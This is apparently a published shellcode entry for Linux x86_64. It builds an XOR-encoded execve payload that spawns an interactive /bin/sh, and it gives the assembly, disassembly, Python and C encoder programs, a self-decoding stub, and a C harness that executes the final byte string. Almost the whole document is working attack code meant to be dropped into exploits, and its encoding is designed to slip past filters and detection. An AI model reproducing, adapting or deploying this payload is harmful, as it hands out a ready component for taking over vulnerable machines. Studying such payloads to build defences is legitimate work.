/*
	# Title : Linux x86_64 XOR encode execve("/bin//sh",{"//bin/sh","-i",NULL},NULL) shellcode
	# Date : 31-05-2016
	# Author : Roziul Hasan Khan Shifat
	# Tested On : Ubuntu 14.04 LTS x86_64
*/


/*
				main code
			------------------------

section .text
	global _start
_start:

xor rax,rax
xor rdx,rdx

push rax
push rax

mov [rsp],dword '//bi'
mov [rsp+4],dword 'n/sh'


mov rdi,rsp


push rax
push rax

mov [rsp],word '-i'
mov rsi,rsp

push rdx
push rsi
push rdi

mov rsi,rsp

add rax,59
syscall


					Disassembly
				     ------------------
Disassembly of section .text:

0000000000400080 <_start>:
  400080:	48 31 c0             	xor    %rax,%rax
  400083:	48 31 d2             	xor    %rdx,%rdx
  400086:	50                   	push   %rax
  400087:	50                   	push   %rax
  400088:	c7 04 24 2f 2f 62 69 	movl   $0x69622f2f,(%rsp)
  40008f:	c7 44 24 04 6e 2f 73 	movl   $0x68732f6e,0x4(%rsp)
  400096:	68
  400097:	48 89 e7             	mov    %rsp,%rdi
  40009a:	50                   	push   %rax
  40009b:	50                   	push   %rax
  40009c:	66 c7 04 24 2d 69    	movw   $0x692d,(%rsp)
  4000a2:	48 89 e6             	mov    %rsp,%rsi
  4000a5:	52                   	push   %rdx
  4000a6:	56                   	push   %rsi
  4000a7:	57                   	push   %rdi
  4000a8:	48 89 e6             	mov    %rsp,%rsi
  4000ab:	48 83 c0 3b          	add    $0x3b,%rax
  4000af:	0f 05                	syscall

*/


/*

					encoder
				   --------------
I used a python script and a C program to encode shellcode


						python script
					   ---------------------
a="\x48\x31\xc0\x48\x31\xd2\x50\x50\xc7\x04\x24\x2f\x2f\x62\x69\xc7\x44\x24\x04\x6e\x2f\x73\x68\x48\x89\xe7\x50\x50\x66\xc7\x04\x24\x2d\x69\x48\x89\xe6\x52\x56\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
print "shellcode length %d"%len(a)
a=a[::-1]

for i in range(len(a)-1):
	print a[i].encode('hex')


						C program
	       				    -----------------

#include<stdio.h>
#include<string.h>
main(int i,char *a[])
{
if(i!=2)
{
printf("Usage %s <filename>\n",a[0]);
return 0;
}



FILE *f,*o;
f=fopen(a[1],"r");
int shell;

o=fopen("shellencode.txt","w");
if(!f || !o )
{
perror("FILE I/O error: ");
return 0;
}

while( (fscanf(f,"%x",&shell)) !=EOF )
{
printf("%.2x\n",shell);
fprintf(o,"%#.2x,",shell^0x90); //0x90 is seed key
fflush(o);
}


fclose(o);
fclose(f);
return 0;
}

---------------------------------------------------------------------------------------------------------------------------------
I am sorry that My python script is very Poor .Search internet for better XOR encoder python script
MY Python script Reverse the shellcode
Then COPY & Paste the rerversed shellcode into a file
then i use the C program to encode reversed shellcode and write down shellencode.txt
-----------------------------------------------------------------------------------------------------------------------------

*/


/*
					decoder
				    ---------------
section .text
	global _start
_start:

jmp shellcode


decoder:
pop rsi
xor rcx,rcx
mov cl,49

cdq

mov dl,0x90 ;seed key

decode:
xor rax,rax
mov al,[rsi]
xor al,dl
dec rsp
mov [rsp],byte al
inc rsi
loop decode

call rsp


shellcode:
call decoder
 db 0x95,0x9f,0xab,0x50,0x13,0xd8,0x76,0x19,0xd8,0xc7,0xc6,0xc2,0x76,0x19,0xd8,0xf9,0xbd,0xb4,0x94,0x57,0xf6,0xc0,0xc0,0x77,0x19,0xd8,0xf8,0xe3,0xbf,0xfe,0x94,0xb4,0xd4,0x57,0xf9,0xf2,0xbf,0xbf,0xb4,0x94,0x57,0xc0,0xc0,0x42,0xa1,0xd8,0x50,0xa1


					Disassembly
				   -------------------

Disassembly of section .text:

0000000000400080 <_start>:
  400080:	eb 1d                	jmp    40009f <shellcode>

0000000000400082 <decoder>:
  400082:	5e                   	pop    %rsi
  400083:	48 31 c9             	xor    %rcx,%rcx
  400086:	b1 31                	mov    $0x31,%cl
  400088:	99                   	cltd
  400089:	b2 90                	mov    $0x90,%dl

000000000040008b <decode>:
  40008b:	48 31 c0             	xor    %rax,%rax
  40008e:	8a 06                	mov    (%rsi),%al
  400090:	30 d0                	xor    %dl,%al
  400092:	48 ff cc             	dec    %rsp
  400095:	88 04 24             	mov    %al,(%rsp)
  400098:	48 ff c6             	inc    %rsi
  40009b:	e2 ee                	loop   40008b <decode>
  40009d:	ff d4                	callq  *%rsp

000000000040009f <shellcode>:
  40009f:	e8 de ff ff ff       	callq  400082 <decoder>
  4000a4:	95                   	xchg   %eax,%ebp
  4000a5:	9f                   	lahf
  4000a6:	ab                   	stos   %eax,%es:(%rdi)
  4000a7:	50                   	push   %rax
  4000a8:	13 d8                	adc    %eax,%ebx
  4000aa:	76 19                	jbe    4000c5 <shellcode+0x26>
  4000ac:	d8 c7                	fadd   %st(7),%st
  4000ae:	c6 c2 76             	mov    $0x76,%dl
  4000b1:	19 d8                	sbb    %ebx,%eax
  4000b3:	f9                   	stc
  4000b4:	bd b4 94 57 f6       	mov    $0xf65794b4,%ebp
  4000b9:	c0 c0 77             	rol    $0x77,%al
  4000bc:	19 d8                	sbb    %ebx,%eax
  4000be:	f8                   	clc
  4000bf:	e3 bf                	jrcxz  400080 <_start>
  4000c1:	fe                   	(bad)
  4000c2:	94                   	xchg   %eax,%esp
  4000c3:	b4 d4                	mov    $0xd4,%ah
  4000c5:	57                   	push   %rdi
  4000c6:	f9                   	stc
  4000c7:	f2 bf bf b4 94 57    	repnz mov $0x5794b4bf,%edi
  4000cd:	c0 c0 42             	rol    $0x42,%al
  4000d0:	a1                   	.byte 0xa1
  4000d1:	d8 50 a1             	fcoms  -0x5f(%rax)

*/

/*
The shellcode decoder.asm is the encoded shellcode
*/


char shellcode[]="\xeb\x1d\x5e\x48\x31\xc9\xb1\x31\x99\xb2\x90\x48\x31\xc0\x8a\x06\x30\xd0\x48\xff\xcc\x88\x04\x24\x48\xff\xc6\xe2\xee\xff\xd4\xe8\xde\xff\xff\xff\x95\x9f\xab\x50\x13\xd8\x76\x19\xd8\xc7\xc6\xc2\x76\x19\xd8\xf9\xbd\xb4\x94\x57\xf6\xc0\xc0\x77\x19\xd8\xf8\xe3\xbf\xfe\x94\xb4\xd4\x57\xf9\xf2\xbf\xbf\xb4\x94\x57\xc0\xc0\x42\xa1\xd8\x50\xa1";


int main(int i,char *a[])
{
(* (int(*)()) shellcode)();

}